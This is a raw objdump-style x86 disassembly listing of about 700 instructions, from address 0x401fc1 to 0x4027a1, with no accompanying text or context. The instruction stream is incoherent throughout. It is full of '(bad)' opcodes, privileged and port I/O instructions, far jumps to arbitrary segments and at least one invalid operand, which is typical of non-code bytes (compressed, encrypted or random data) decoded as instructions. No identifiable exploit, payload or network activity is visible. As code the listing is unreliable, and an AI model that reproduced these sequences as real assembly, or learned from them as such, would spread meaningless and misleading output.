  401fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc2:	lods   al,BYTE PTR ds:[esi]
  401fc3:	(bad)  
  401fc5:	int3   
  401fc6:	mov    al,0xed
  401fc8:	hlt    
  401fc9:	std    
  401fca:	jle    0x401ff2
  401fcc:	pop    ds
  401fcd:	iret   
  401fce:	push   DWORD PTR [eax]
  401fd0:	mov    esp,ebx
  401fd2:	pop    ss
  401fd3:	aam    0xf8
  401fd5:	repnz mov dh,0x6a
  401fd8:	in     eax,dx
  401fd9:	mov    ah,0x45
  401fdb:	lea    ecx,[ebp-0x4]
  401fde:	or     eax,0x18687834
  401fe3:	shr    edi,1
  401fe5:	cmp    DWORD PTR [edx],0xfffffff6
  401fe8:	xchg   ecx,eax
  401fe9:	mov    BYTE PTR [eax+edx*4-0x55],ah
  401fed:	stos   BYTE PTR es:[edi],al
  401fee:	add    DWORD PTR [ebp-0x8194475],esi
  401ff4:	aaa    
  401ff5:	sti    
  401ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff7:	repz jmp 0xfaf2:0x3a0b8bc2
  401fff:	mov    cl,0x91
  402001:	push   0xd72fde58
  402006:	cmp    eax,0xa0f6f346
  40200b:	ds dec ebx
  40200d:	call   FWORD PTR [eax]
  40200f:	into   
  402010:	(bad)  
  402011:	mov    esp,0x7995e710
  402016:	dec    edi
  402017:	arpl   WORD PTR [edx-0x12],si
  40201a:	sahf   
  40201b:	(bad)  
  40201c:	repnz cmc 
  40201e:	xor    al,0xc0
  402020:	dec    ecx
  402021:	test   eax,0x5f8bebae
  402026:	enter  0xa200,0xd8
  40202a:	mov    cl,BYTE PTR ds:0xe0eef23a
  402030:	(bad)  
  402031:	dec    edi
  402032:	ins    DWORD PTR es:[edi],dx
  402033:	lea    ecx,[ebx-0x639a0ce9]
  402039:	adc    esi,DWORD PTR [edi+esi*8+0x67990215]
  402040:	(bad)  
  402041:	aad    0x9
  402043:	std    
  402044:	outs   dx,BYTE PTR ds:[esi]
  402045:	jbe    0x401fe6
  402047:	in     al,0x13
  402049:	inc    edx
  40204a:	stos   DWORD PTR es:[edi],eax
  40204b:	cmc    
  40204c:	push   ss
  40204d:	cmp    BYTE PTR [ebx],bl
  40204f:	push   0xffffffc9
  402051:	and    DWORD PTR [ebx-0x62],ebx
  402054:	mov    bh,0x91
  402056:	clc    
  402057:	cmc    
  402058:	sub    DWORD PTR [edi+0x28],edi
  40205b:	ja     0x4020bb
  40205d:	mov    dl,0xd
  40205f:	mov    gs,WORD PTR [eax+0x1d4ad578]
  402065:	jecxz  0x4020d5
  402067:	mov    dl,BYTE PTR es:[eax+0x54]
  40206b:	shl    BYTE PTR [ebx-0x2555d417],1
  402071:	push   ecx
  402072:	jge    0x4020c4
  402074:	bound  ecx,QWORD PTR [esi]
  402076:	push   0xffffffa7
  402078:	dec    eax
  402079:	dec    edx
  40207a:	cmp    eax,0x30ba4fd9
  40207f:	sar    BYTE PTR [edi],1
  402081:	xchg   ecx,eax
  402082:	dec    esp
  402083:	jge    0x40208a
  402085:	jno    0x40205c
  402087:	ja     0x40209f
  402089:	pop    ss
  40208a:	sub    BYTE PTR [edx-0x2a],ch
  40208d:	in     eax,dx
  40208e:	jmp    0x40201a
  402090:	gs jl  0x402063
  402093:	jmp    0x9da:0xed7a39cd
  40209a:	dec    edx
  40209b:	xchg   esp,eax
  40209c:	pusha  
  40209d:	xor    esi,ecx
  40209f:	cs test eax,0xcc0625a4
  4020a5:	add    edi,DWORD PTR [ecx+0x35]
  4020a8:	and    bh,BYTE PTR [ebp-0x54c18f5e]
  4020ae:	xchg   edx,eax
  4020af:	push   ss
  4020b0:	addr16 out 0x20,al
  4020b3:	and    ecx,edi
  4020b5:	stos   DWORD PTR es:[edi],eax
  4020b6:	(bad)  
  4020b7:	ficomp DWORD PTR [eax-0x611a65e1]
  4020bd:	and    BYTE PTR [ecx+0x24b2c511],ah
  4020c3:	(bad)  
  4020c4:	mov    BYTE PTR [ebx+eax*8+0x37aa80d2],ah
  4020cb:	xchg   BYTE PTR [ecx+0x5d],bl
  4020ce:	adc    eax,0x411db8c3
  4020d3:	xchg   ebx,eax
  4020d4:	sub    al,0xf9
  4020d6:	cmp    edx,DWORD PTR [ebx+0x25513e9]
  4020dc:	leave  
  4020dd:	cs mov edx,ebx
  4020e0:	and    dl,BYTE PTR [ebp+0x34]
  4020e3:	cdq    
  4020e4:	mov    edx,0x267d70be
  4020e9:	jp     0x4020cd
  4020eb:	retf   
  4020ec:	dec    ebp
  4020ed:	in     al,0x6c
  4020ef:	outs   dx,DWORD PTR ds:[esi]
  4020f0:	pop    esi
  4020f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f2:	ss fwait
  4020f4:	cmc    
  4020f5:	not    DWORD PTR [edi-0x7bdb6ce1]
  4020fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020fc:	dec    edi
  4020fd:	(bad)  
  4020fe:	cmp    dh,cl
  402100:	cmp    DWORD PTR [esp+eax*2+0x5c],ebp
  402104:	add    eax,0x6d303619
  402109:	dec    esi
  40210a:	push   cs
  40210b:	dec    ebp
  40210c:	cmp    al,0x7c
  40210e:	jecxz  0x4020b8
  402110:	inc    ebp
  402111:	(bad)  
  402112:	push   ebx
  402113:	lods   al,BYTE PTR ds:[esi]
  402114:	jbe    0x4020f8
  402116:	add    DWORD PTR [eax+0x19],eax
  402119:	push   0x11
  40211b:	or     eax,0xe4519ea3
  402120:	xor    al,0xc
  402122:	repnz shl DWORD PTR ds:0xc4c1de12,0xd
  40212a:	and    BYTE PTR [esi+0x331d206b],ch
  402130:	and    cl,ah
  402132:	cmp    al,0x49
  402134:	sub    al,0x83
  402136:	mov    ch,ch
  402138:	(bad)  
  402139:	dec    esp
  40213a:	int    0xd8
  40213c:	sbb    ah,BYTE PTR [edi]
  40213e:	xor    eax,0x23cf01c8
  402143:	sbb    eax,0x60c9b885
  402148:	test   eax,0xabcc5906
  40214d:	pop    edx
  40214e:	test   DWORD PTR [eax+ecx*1],ecx
  402151:	pop    DWORD PTR [ebp+0x3ae6f10a]
  402157:	mov    cl,0xfa
  402159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40215a:	sbb    eax,0x8d4ff605
  40215f:	and    BYTE PTR [eax],bh
  402161:	sbb    edx,esp
  402163:	mov    eax,DWORD PTR [ebx+ecx*8-0x2aad356e]
  40216a:	add    BYTE PTR [ecx+esi*8+0x6aff9d26],cl
  402171:	hlt    
  402172:	outs   dx,BYTE PTR ds:[esi]
  402173:	ret    0xb205
  402176:	and    BYTE PTR [esi-0x2e],ah
  402179:	in     eax,dx
  40217a:	shl    DWORD PTR [eax+eax*2-0x7bb6a6fc],cl
  402181:	push   edx
  402182:	add    DWORD PTR [ecx-0x19644bbf],ebp
  402188:	or     DWORD PTR [eax],0x3473d117
  40218e:	dec    esp
  40218f:	inc    eax
  402190:	out    dx,al
  402191:	xlat   BYTE PTR ds:[ebx]
  402192:	rol    ah,cl
  402194:	iret   
  402195:	mov    edx,0x33b856ec
  40219a:	repz or eax,0xc5cd6f0f
  4021a0:	inc    esp
  4021a1:	ret    0xd156
  4021a4:	jbe    0x402139
  4021a6:	ins    BYTE PTR es:[edi],dx
  4021a7:	and    eax,0x481869a4
  4021ac:	pop    edx
  4021ad:	mov    bl,0xbb
  4021af:	mov    ds:0xa5a35390,eax
  4021b4:	stos   DWORD PTR es:[edi],eax
  4021b5:	and    edi,DWORD PTR [ebx-0x44]
  4021b8:	mov    edi,0xae26f56f
  4021bd:	sub    al,0xc6
  4021bf:	mov    DWORD PTR [eax],ebx
  4021c1:	mov    esp,0x6b06b589
  4021c6:	rol    BYTE PTR [esi-0x3b],cl
  4021c9:	pop    ss
  4021ca:	lahf   
  4021cb:	push   ebp
  4021cc:	push   0x5aed7c6e
  4021d1:	add    al,0x41
  4021d3:	ficomp DWORD PTR [ebp+0x5ee0af70]
  4021d9:	push   esp
  4021da:	test   DWORD PTR [ebp+edx*8+0x29],esi
  4021de:	ds arpl di,bx
  4021e1:	pop    ds
  4021e2:	and    dh,bl
  4021e4:	and    BYTE PTR ds:0x4f4f1653,cl
  4021ea:	add    eax,0x1ce90e74
  4021ef:	mov    bl,BYTE PTR [edx]
  4021f1:	mov    ah,0xa1
  4021f3:	mov    dl,0xc9
  4021f5:	push   cs
  4021f6:	sbb    ah,ah
  4021f8:	and    dh,dl
  4021fa:	popf   
  4021fb:	leave  
  4021fc:	daa    
  4021fd:	sub    eax,DWORD PTR [ecx+0x27]
  402200:	jns    0x402253
  402202:	add    esi,esp
  402204:	cmp    bh,BYTE PTR ds:0xd36d01e6
  40220a:	push   ebx
  40220b:	sub    BYTE PTR [ecx-0x4f],ah
  40220e:	inc    edx
  40220f:	popf   
  402210:	dec    edx
  402211:	fmul   st,st(5)
  402213:	ror    bh,0xef
  402216:	cs repz pop esi
  402219:	add    BYTE PTR cs:[ebp+0x7f],0x37
  40221e:	jg     0x4021a5
  402220:	xor    DWORD PTR [edx-0x72],esp
  402223:	leave  
  402224:	sbb    ch,al
  402226:	mov    ds:0x6f59db6e,al
  40222b:	cmp    cl,dh
  40222d:	pop    ds
  40222e:	pop    eax
  40222f:	xor    al,0x7d
  402231:	scas   al,BYTE PTR es:[edi]
  402232:	cwde   
  402233:	push   ebx
  402234:	cmc    
  402235:	pop    ecx
  402236:	xchg   ecx,eax
  402237:	retf   0x44d5
  40223a:	cmp    eax,0x2e9ec988
  40223f:	dec    esp
  402240:	imul   esp,ebp,0x7b
  402243:	xor    eax,0xaa4771be
  402248:	imul   edi,DWORD PTR [esi*2+0x36882c9f],0x24
  402250:	pop    ss
  402251:	stos   DWORD PTR es:[edi],eax
  402252:	jp     0x402216
  402254:	jno    0x402281
  402256:	add    al,ch
  402258:	add    ah,BYTE PTR [esi+0x7b1ee3b2]
  40225e:	lods   al,BYTE PTR ds:[esi]
  40225f:	int    0x51
  402261:	data16 mov al,0xa1
  402264:	mov    WORD PTR [edx],ds
  402266:	ret    
  402267:	push   ss
  402268:	push   ss
  402269:	mov    ah,0x31
  40226b:	pop    edx
  40226c:	xlat   BYTE PTR ds:[ebx]
  40226d:	lock cmc 
  40226f:	push   ebp
  402270:	imul   eax,DWORD PTR [edx+ebp*2-0x67],0x70
  402275:	cli    
  402276:	ret    
  402277:	(bad)  
  402278:	mov    DWORD PTR [esi-0x4d521578],0x23aaf7b
  402282:	cmp    bl,cl
  402284:	push   ebx
  402285:	adc    esi,DWORD PTR [edi+0x28f0e4a6]
  40228b:	push   ebp
  40228c:	sbb    al,0x49
  40228e:	into   
  40228f:	rol    ah,1
  402291:	enter  0x1a8,0x33
  402295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402296:	sbb    BYTE PTR [eax-0x27],cl
  402299:	add    al,0xad
  40229b:	adc    eax,0x86baaa0d
  4022a0:	enter  0xe61e,0x5d
  4022a4:	and    DWORD PTR [edx+0x1a],ecx
  4022a7:	jecxz  0x402249
  4022a9:	sar    DWORD PTR [esi+0x5a],0x46
  4022ad:	stos   DWORD PTR es:[edi],eax
  4022ae:	(bad)  
  4022b0:	dec    edi
  4022b1:	add    cl,BYTE PTR [ecx+0x71]
  4022b4:	jne    0x402293
  4022b6:	jns    0x40229f
  4022b8:	outs   dx,BYTE PTR ds:[esi]
  4022b9:	mov    ch,0xe6
  4022bb:	imul   esi,DWORD PTR [edx-0x10],0x12
  4022bf:	mov    bh,0x8a
  4022c1:	test   ebx,ebp
  4022c3:	jbe    0x4022ab
  4022c5:	pop    ds
  4022c6:	adc    dh,BYTE PTR ss:[esi+0x1c]
  4022ca:	loop   0x4022b2
  4022cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022cd:	inc    esp
  4022ce:	push   ebp
  4022cf:	xchg   esi,eax
  4022d0:	jnp    0x4022fc
  4022d2:	adc    BYTE PTR [ecx],ch
  4022d4:	mov    WORD PTR [ebx-0x4f76c050],fs
  4022da:	inc    ebx
  4022db:	inc    esi
  4022dc:	mov    eax,ds:0x884f7beb
  4022e1:	sub    al,0x51
  4022e3:	xor    bl,dh
  4022e5:	cld    
  4022e6:	push   eax
  4022e7:	jg     0x40233d
  4022e9:	mov    dh,BYTE PTR ds:0xbe87758d
  4022ef:	stos   DWORD PTR es:[edi],eax
  4022f0:	push   ss
  4022f1:	out    dx,eax
  4022f2:	or     eax,0x6338a89a
  4022f7:	aaa    
  4022f8:	cmc    
  4022f9:	adc    esp,esi
  4022fb:	in     al,dx
  4022fc:	push   edx
  4022fd:	ror    BYTE PTR [ebx*8-0x25da7958],0xa6
  402305:	lahf   
  402306:	and    al,0xe0
  402308:	int3   
  402309:	pop    ebp
  40230a:	cmp    eax,0x3392c03a
  40230f:	jmp    0x402296
  402311:	not    BYTE PTR es:[eiz*2+0x52df921b]
  402319:	cmp    BYTE PTR [ebx-0x8],dl
  40231c:	mov    eax,0xa8032c29
  402321:	pop    ds
  402322:	push   esp
  402323:	scas   al,BYTE PTR es:[edi]
  402324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402325:	push   ebx
  402326:	mov    ecx,0xbc613ab9
  40232b:	jns    0x402386
  40232d:	iret   
  40232e:	(bad)  
  40232f:	mov    eax,ds:0x2f5ddae1
  402334:	dec    ebp
  402335:	pushf  
  402336:	cdq    
  402337:	xor    DWORD PTR [eax+0x2393f862],ebp
  40233d:	push   ebp
  40233e:	push   0xa9e6697a
  402343:	nop
  402344:	enter  0x125e,0x25
  402348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234a:	mov    al,0x70
  40234c:	(bad)  
  40234d:	loop   0x4023c6
  40234f:	push   edi
  402350:	pop    ecx
  402351:	ja     0x402360
  402353:	fmul   QWORD PTR [ebx]
  402355:	pop    eax
  402356:	aad    0xd1
  402358:	mov    dh,0xbd
  40235a:	bound  ebp,QWORD PTR [eax+0x3c384fb7]
  402360:	cmp    eax,0x251dbda7
  402365:	bound  edx,QWORD PTR [ecx+0x7e]
  402368:	dec    esp
  402369:	(bad)  
  40236a:	pop    edi
  40236b:	ds jg  0x40230d
  40236e:	dec    edi
  40236f:	inc    edx
  402370:	dec    ebp
  402371:	xchg   BYTE PTR [ecx+0x16c98b51],ah
  402377:	xor    eax,0x2811695a
  40237c:	jecxz  0x40239c
  40237e:	inc    eax
  40237f:	mov    ch,BYTE PTR [eax]
  402381:	cwde   
  402382:	cmp    esp,eax
  402384:	stos   BYTE PTR es:[edi],al
  402385:	jg     0x402356
  402387:	aaa    
  402388:	cmp    edi,DWORD PTR [eax]
  40238a:	mov    ebx,0x5776bf3c
  40238f:	int3   
  402390:	es xchg edi,eax
  402392:	fisttp QWORD PTR [edi]
  402394:	and    dl,ah
  402396:	xor    al,0x14
  402398:	in     eax,0x8d
  40239a:	or     bl,BYTE PTR [edi-0x20]
  40239d:	jg     0x4023eb
  40239f:	sahf   
  4023a0:	rcr    ebx,1
  4023a2:	bound  ebp,QWORD PTR [edx+ebx*8-0x4d]
  4023a6:	adc    eax,0x2a4cf5e3
  4023ab:	ret    0x4246
  4023ae:	popf   
  4023af:	sub    bl,BYTE PTR [eax+eax*1+0x77ccbe7f]
  4023b6:	out    0xc7,al
  4023b8:	in     eax,0xaf
  4023ba:	cmp    ch,BYTE PTR [ebx-0x13]
  4023bd:	(bad)  
  4023be:	push   cs
  4023bf:	xchg   esp,eax
  4023c0:	mov    WORD PTR [esi+ecx*2-0x6d],fs
  4023c4:	popf   
  4023c5:	xchg   esi,eax
  4023c6:	lods   al,BYTE PTR ds:[esi]
  4023c7:	(bad)  
  4023c8:	sub    BYTE PTR [esi-0x74346391],dh
  4023ce:	lahf   
  4023cf:	mov    edi,0xe28c8898
  4023d4:	cli    
  4023d5:	push   edi
  4023d6:	cmp    esi,DWORD PTR [eax-0x5c]
  4023d9:	mov    ds:0x89b43ef1,eax
  4023de:	cmp    al,0x6a
  4023e0:	mov    esp,DWORD PTR [edi+0x2f2124ed]
  4023e6:	sbb    DWORD PTR [eax+eiz*2-0x5cd019ae],ecx
  4023ed:	cdq    
  4023ee:	(bad)  
  4023f0:	push   ss
  4023f1:	cmp    ecx,ebx
  4023f3:	leave  
  4023f4:	jae    0x4023e1
  4023f6:	popf   
  4023f7:	inc    ebp
  4023f8:	sbb    dl,BYTE PTR [ebx+0x6d553b32]
  4023fe:	(bad)  
  4023ff:	in     eax,0x33
  402401:	retf   
  402402:	popa   
  402403:	shl    BYTE PTR [eax-0x2c6f5606],0x89
  40240a:	sbb    eax,0x2477d762
  40240f:	rcl    DWORD PTR [esi+0x7ec53bf6],0xff
  402416:	mov    ecx,0x656704e0
  40241b:	jb     0x40243e
  40241d:	(bad)  
  40241e:	fmul   st,st(6)
  402420:	or     DWORD PTR [edi],0x885dea78
  402426:	mov    esi,DWORD PTR [ebx]
  402428:	(bad)  
  402429:	test   eax,0x3421441f
  40242e:	push   ss
  40242f:	dec    ebx
  402430:	pop    esp
  402431:	jns    0x402413
  402433:	fwait
  402434:	lds    edi,FWORD PTR [edi-0x72]
  402437:	push   edi
  402438:	and    al,0x67
  40243a:	and    al,bh
  40243c:	shl    DWORD PTR [ecx+0x363325bf],cl
  402442:	push   ecx
  402443:	mov    dl,al
  402445:	mov    eax,ds:0x6e3f8652
  40244a:	sub    al,0x2c
  40244c:	inc    esp
  40244d:	cwde   
  40244e:	dec    eax
  40244f:	adc    al,0x82
  402451:	pop    ebp
  402452:	stos   DWORD PTR es:[edi],eax
  402453:	fld    DWORD PTR [ebx]
  402455:	mov    ebp,0xaef34279
  40245a:	stc    
  40245b:	dec    ebp
  40245c:	jg     0x40241c
  40245e:	fistp  WORD PTR [eax]
  402460:	data16 mov WORD PTR [ecx+eax*2-0x37],ss
  402465:	or     eax,DWORD PTR [ebx]
  402467:	out    dx,al
  402468:	adc    BYTE PTR [ebx+0x32],dl
  40246b:	mul    BYTE PTR [ebp-0x5b]
  40246e:	mov    al,ds:0xac76ec41
  402473:	sub    BYTE PTR [ebx],ah
  402475:	out    dx,al
  402476:	gs add al,0x7a
  402479:	pop    edx
  40247a:	sub    eax,0xa6f71246
  40247f:	jb     0x40241b
  402481:	pusha  
  402482:	fidivr DWORD PTR [eax]
  402484:	mov    esi,0x43b824da
  402489:	std    
  40248a:	cmp    ah,BYTE PTR [ebx-0x6b24bb1b]
  402490:	xchg   ecx,eax
  402491:	inc    ebp
  402492:	std    
  402493:	cmp    DWORD PTR [ecx-0x723c1d08],0x859ae8e4
  40249d:	cmp    eax,0xb2fdeabf
  4024a2:	push   esi
  4024a3:	jnp    0x4024b8
  4024a5:	ins    BYTE PTR es:[edi],dx
  4024a6:	data16 loopne 0x402444
  4024a9:	(bad)  
  4024aa:	mov    esi,0x5e140e50
  4024af:	mov    ebp,0x4b60fbea
  4024b4:	dec    edi
  4024b5:	call   0xf4b:0xcf7763d1
  4024bc:	mov    ds:0x91fa44ce,al
  4024c1:	mov    dl,0x14
  4024c3:	xchg   DWORD PTR [edi],edi
  4024c5:	pop    esp
  4024c6:	pop    ss
  4024c7:	mov    ecx,0x2596774c
  4024cc:	lods   al,BYTE PTR ds:[esi]
  4024cd:	iret   
  4024ce:	push   es
  4024cf:	fsubr  QWORD PTR [ecx-0x9b9d053]
  4024d5:	int3   
  4024d6:	xchg   ecx,eax
  4024d7:	neg    BYTE PTR [esi+0x1a]
  4024da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024db:	mov    ds:0xef858e16,eax
  4024e0:	or     BYTE PTR ds:0xa20f788e,dl
  4024e6:	aad    0x7d
  4024e8:	mul    ebx
  4024ea:	loopne 0x40251e
  4024ec:	push   eax
  4024ed:	sti    
  4024ee:	je     0x40253e
  4024f0:	inc    edx
  4024f1:	int    0xbe
  4024f3:	aad    0x9f
  4024f5:	xor    al,0x5e
  4024f7:	sub    BYTE PTR [edi-0x538c98b7],al
  4024fd:	cli    
  4024fe:	test   eax,0xc12e7ad7
  402503:	pusha  
  402504:	cmp    ebp,ebx
  402506:	hlt    
  402507:	aaa    
  402508:	sahf   
  402509:	sbb    esi,DWORD PTR [edi+0x20b6fb19]
  40250f:	add    al,0xa1
  402511:	pop    esi
  402512:	fcomp  DWORD PTR [esi-0x132c1bab]
  402518:	lods   al,BYTE PTR ds:[esi]
  402519:	in     al,0xdf
  40251b:	aas    
  40251c:	aaa    
  40251d:	loop   0x4024f7
  40251f:	shl    ecx,0xb1
  402522:	inc    ecx
  402523:	cwde   
  402524:	mov    cl,ch
  402526:	push   ecx
  402527:	loope  0x402578
  402529:	out    0x75,eax
  40252b:	sahf   
  40252c:	repz in eax,0x5e
  40252f:	(bad)  
  402530:	repnz neg DWORD PTR [edi]
  402533:	imul   ecx,edi,0x5c64ad0d
  402539:	mov    ebx,0xcedb1e06
  40253e:	repz jl 0x40255e
  402541:	out    dx,al
  402542:	adc    edi,DWORD PTR [edi]
  402544:	mov    edi,0x6915bb0d
  402549:	stos   DWORD PTR es:[edi],eax
  40254a:	sub    ch,BYTE PTR [ebx-0x1ca6d296]
  402550:	push   edx
  402551:	xchg   edx,eax
  402552:	and    eax,0xcb108d2f
  402557:	adc    ecx,ecx
  402559:	or     bl,bl
  40255b:	and    BYTE PTR [eax+0x6b],bh
  40255e:	mov    al,ds:0x83583aa6
  402563:	mov    ds:0x58a129f8,al
  402568:	repnz push 0x22b576af
  40256e:	sbb    BYTE PTR ds:0x418ec873,al
  402574:	mov    ch,0x86
  402576:	jge    0x402521
  402578:	sub    ch,BYTE PTR [esi]
  40257a:	jl     0x4025ae
  40257c:	inc    edi
  40257d:	mov    edi,0x29d9ac90
  402582:	mov    DWORD PTR [ebp+0x286461b9],esp
  402588:	jae    0x402525
  40258a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40258b:	mov    fs,WORD PTR [ecx-0x760d749e]
  402591:	xor    eax,0x496e5c81
  402596:	loop   0x402607
  402598:	loop   0x4025d7
  40259a:	sbb    DWORD PTR [edx+0x7687021b],0x73
  4025a1:	data16 or al,BYTE PTR [ecx]
  4025a4:	or     edx,DWORD PTR [edi+0x281fb695]
  4025aa:	lea    esi,[ebp-0x55]
  4025ad:	sbb    DWORD PTR [ecx-0x5d],0x49
  4025b1:	repnz imul BYTE PTR gs:[eax]
  4025b5:	jl     0x4025ba
  4025b7:	in     eax,0xa7
  4025b9:	imul   esi,DWORD PTR [ebp+edx*2-0x5d2fb867],0x7216eb09
  4025c4:	ret    0x7364
  4025c7:	mov    al,0x25
  4025c9:	jae    0x4025fc
  4025cb:	(bad)  
  4025cc:	test   BYTE PTR [edi+edi*8-0x75],bh
  4025d0:	es sub eax,0xac8a3c46
  4025d6:	shl    DWORD PTR [ebp+0x6c625e6e],cl
  4025dc:	(bad)  
  4025dd:	in     al,0xdf
  4025df:	mov    ecx,0xe8460beb
  4025e4:	xlat   BYTE PTR ds:[ebx]
  4025e5:	dec    ecx
  4025e6:	xchg   ebp,eax
  4025e7:	jg     0x4025c5
  4025e9:	pop    eax
  4025ea:	test   BYTE PTR [ecx+0x7047e4ce],cl
  4025f0:	mov    dl,0x1f
  4025f2:	es jns 0x402644
  4025f5:	pop    esp
  4025f6:	int3   
  4025f7:	xor    bl,bh
  4025f9:	in     eax,0xb5
  4025fb:	mov    bl,0x95
  4025fd:	add    BYTE PTR [ebp+edi*2-0x3b],0x39
  402602:	nop
  402603:	js     0x402600
  402605:	adc    eax,0x609c3969
  40260a:	mov    cl,0x80
  40260c:	adc    eax,0xbc298fab
  402611:	cs pop ebp
  402613:	loop   0x40262a
  402615:	ret    
  402616:	popf   
  402617:	rcr    BYTE PTR [ebx-0xe926dea],cl
  40261d:	nop
  40261e:	shl    BYTE PTR [ecx-0xa],1
  402621:	sub    DWORD PTR [ebp+0x54],eax
  402624:	or     eax,0x7595c6ee
  402629:	and    BYTE PTR [edx-0x494971a5],0x0
  402630:	fdiv   DWORD PTR [edx]
  402632:	aad    0x9
  402634:	cdq    
  402635:	pop    esi
  402636:	mov    bl,0xd1
  402638:	add    eax,0x2168c83a
  40263d:	add    al,0xa0
  40263f:	aam    0xa5
  402641:	sahf   
  402642:	xchg   ecx,eax
  402643:	sub    BYTE PTR [esi+ebx*2-0x3cadff0],al
  40264a:	lock pushf 
  40264c:	sbb    DWORD PTR [eax-0x5a],edx
  40264f:	mov    ebx,0x51ab0e78
  402654:	int3   
  402655:	xor    BYTE PTR [eax+0x5b1646f],bl
  40265b:	dec    esp
  40265c:	test   esi,edx
  40265e:	leave  
  40265f:	mov    dh,0xbf
  402661:	xor    DWORD PTR es:[eax],esp
  402664:	hlt    
  402665:	cdq    
  402666:	cwde   
  402667:	xchg   BYTE PTR [ebx+0x2b],bl
  40266a:	hlt    
  40266b:	fwait
  40266c:	stos   BYTE PTR es:[edi],al
  40266d:	fcom   QWORD PTR [ebp+0x15]
  402670:	(bad)  
  402671:	mov    ecx,DWORD PTR [edi+0x38]
  402674:	mov    bl,BYTE PTR [ebx]
  402676:	push   eax
  402677:	stos   BYTE PTR es:[edi],al
  402678:	fmul   DWORD PTR [esi+eax*4-0x66]
  40267c:	mov    ?,WORD PTR [ebp+0x46]
  40267f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402680:	mov    ch,0x4
  402682:	push   ebx
  402683:	shl    BYTE PTR [ebp+0x58066d87],0xf4
  40268a:	sbb    DWORD PTR [esi+0x49],0x6f8ea6e3
  402691:	inc    eax
  402692:	fild   WORD PTR [esi]
  402694:	cli    
  402695:	icebp  
  402696:	jne    0x402689
  402698:	mov    dl,dl
  40269a:	mov    dl,0x66
  40269c:	(bad)  
  40269d:	neg    BYTE PTR [ebx+0x2e]
  4026a0:	ror    DWORD PTR [edi+0x75661689],cl
  4026a6:	pop    es
  4026a7:	fucomp st(0)
  4026a9:	test   DWORD PTR [ecx],0x9fd2b70d
  4026af:	das    
  4026b0:	(bad)  
  4026b1:	retf   
  4026b2:	mov    DWORD PTR [ecx+0x23],eax
  4026b5:	loope  0x402637
  4026b7:	mov    BYTE PTR [esi-0x34],ch
  4026ba:	dec    ebp
  4026bb:	cwde   
  4026bc:	addr16 or al,0xc0
  4026bf:	sub    ebp,edi
  4026c1:	(bad)  ds:0xae5debd
  4026c7:	xor    al,0x4b
  4026c9:	into   
  4026ca:	inc    edi
  4026cb:	sub    DWORD PTR [ecx],eax
  4026cd:	xchg   ebp,eax
  4026ce:	sahf   
  4026cf:	adc    al,0x1f
  4026d1:	add    DWORD PTR [edi-0x49c30dc9],0xffffffe9
  4026d8:	add    BYTE PTR [edx+edx*4+0xe912b28],cl
  4026df:	stos   DWORD PTR es:[edi],eax
  4026e0:	sbb    eax,0x59993114
  4026e5:	mov    al,0xe3
  4026e7:	xchg   ecx,eax
  4026e8:	adc    al,0xa1
  4026ea:	jb     0x402769
  4026ec:	pop    ebx
  4026ed:	push   cs
  4026ee:	ficomp WORD PTR ds:0x95513c0
  4026f4:	(bad)  
  4026f5:	arpl   WORD PTR [edi*4-0x26c85000],bp
  4026fc:	inc    edx
  4026fd:	or     eax,0x51313f0d
  402702:	mov    bh,0x33
  402704:	mov    edi,0x44b7c74f
  402709:	dec    esp
  40270a:	popa   
  40270b:	inc    DWORD PTR [esi+0x2a]
  40270e:	clc    
  40270f:	cmp    al,0x59
  402711:	ds cdq 
  402713:	xor    al,0xf0
  402715:	out    0xba,al
  402717:	dec    ecx
  402718:	in     eax,0xdf
  40271a:	repnz ficom DWORD PTR [edi+ebp*2+0x14]
  40271f:	inc    esp
  402720:	mov    edi,0x8006a7c6
  402725:	dec    edi
  402726:	fstp   st(6)
  402728:	xor    esi,DWORD PTR [eax+0x67]
  40272b:	dec    al
  40272d:	fdivr  QWORD PTR [ecx+0x6b]
  402730:	jno    0x402799
  402732:	aas    
  402733:	cwde   
  402734:	(bad)  
  402735:	icebp  
  402736:	jnp    0x402703
  402738:	jmp    0x4026bb
  40273a:	push   es
  40273b:	test   eax,0xfc1281c4
  402740:	jbe    0x40274b
  402742:	sub    BYTE PTR [eax+0x1cbfaa2f],ch
  402748:	add    BYTE PTR [edi-0x29],bh
  40274b:	es lock out 0x3c,eax
  40274f:	dec    ebx
  402750:	inc    edx
  402751:	dec    esp
  402752:	out    0x24,eax
  402754:	push   ds
  402755:	out    dx,eax
  402756:	ins    DWORD PTR es:[edi],dx
  402757:	mov    bh,0xf
  402759:	lods   al,BYTE PTR ds:[esi]
  40275a:	out    dx,al
  40275b:	out    dx,eax
  40275c:	mov    al,ds:0xaa6d7689
  402761:	pusha  
  402762:	inc    esi
  402763:	jns    0x40276b
  402765:	pop    esi
  402766:	mov    edi,0x5d8d123a
  40276b:	push   es
  40276c:	ins    DWORD PTR es:[edi],dx
  40276d:	mov    al,ds:0xef1acc65
  402772:	xor    bh,BYTE PTR [ecx-0x20]
  402775:	aas    
  402776:	jne    0x402741
  402778:	pushf  
  402779:	cmp    esp,DWORD PTR [ecx-0x19]
  40277c:	jp     0x40276b
  40277e:	pop    ecx
  40277f:	dec    esi
  402780:	loopne 0x402742
  402782:	or     ebp,DWORD PTR [eax-0x33]
  402785:	lods   eax,DWORD PTR ds:[esi]
  402786:	add    eax,edx
  402788:	js     0x40274e
  40278a:	cld    
  40278b:	mov    eax,ds:0xa6580165
  402790:	test   esp,eax
  402792:	scas   eax,DWORD PTR es:[edi]
  402793:	mov    ecx,0x6699aeb
  402798:	push   edx
  402799:	(bad)  
  40279a:	ins    BYTE PTR es:[edi],dx
  40279b:	pop    ebp
  40279c:	dec    ebx
  40279d:	test   dh,cl
  40279f:	add    al,0x5
  4027a1:	push   ebp
